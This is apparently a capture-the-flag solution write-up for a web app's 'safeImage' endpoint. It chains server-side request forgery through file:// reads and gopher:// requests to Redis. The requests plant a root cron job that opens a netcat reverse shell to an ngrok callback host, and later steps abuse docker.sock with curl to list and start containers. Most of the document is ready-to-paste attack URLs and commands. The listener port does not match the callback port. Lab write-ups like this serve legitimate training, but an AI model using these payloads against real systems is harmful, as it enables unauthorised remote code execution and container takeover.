# Solution

1.  Check out the source.  

```
<!-- 
    
    TODO: 
        * Move redis to it's own server.
        * Update the docker server status page.
        * fix some "safeImage" rendering bugs
    -->
```

Now we know there is redis on the server.  We know this is inside of a docker container and we know there are a few bugs around `safeImage`.

2. view-source:http://localhost:5000/safeImage/?url=file:///proc/self/cmdline
3. You can see the application
  ```view-source:http://localhost:5000/safeImage/?url=file:///app/app.py```
4. You have arbitrary write 

  Add a redis "value" with a payload for a cron job: (I am using 0.tcp.ngrok.io as my call back you should change this to your callback box) 

  ```http://localhost:5000/safeImage/?url=gopher://127.0.0.1:6379/_set%20x%20%22%5Cn%5Cn*/1%20*%20*%20*%20*%20nc%200.tcp.ngrok.io%3A15967%20-e%20/bin/sh%5Cn%5Cn%22```

  Set the redis config to write the DB to /var/spool/cron/crontabs/ 

  ```http://localhost:5000/safeImage/?url=gopher://127.0.0.1:6379/_config%20set%20dir%20/var/spool/cron/crontabs/```

  Set the file name to "root"

  ```http://localhost:5000/safeImage/?url=gopher://127.0.0.1:6379/_config%20set%20dbfilename%20root```

  Call redis "save"

  ```http://localhost:5000/safeImage/?url=gopher://127.0.0.1:6379/_save```

5. Run your local reverse shell listener ```nc -l 1337```
6. use the docker.sock file and CURLto get information about the containers: 
   ```curl --unix-socket /var/run/docker.sock http:/v1.24/containers/json```
7. Bring up the service (replace with the containter ids from above)
  ```curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/a9968f67f75bb073f1f37b2d5c83579d77a0c22f642fc0e27c9a0c3d6cb65685/start```
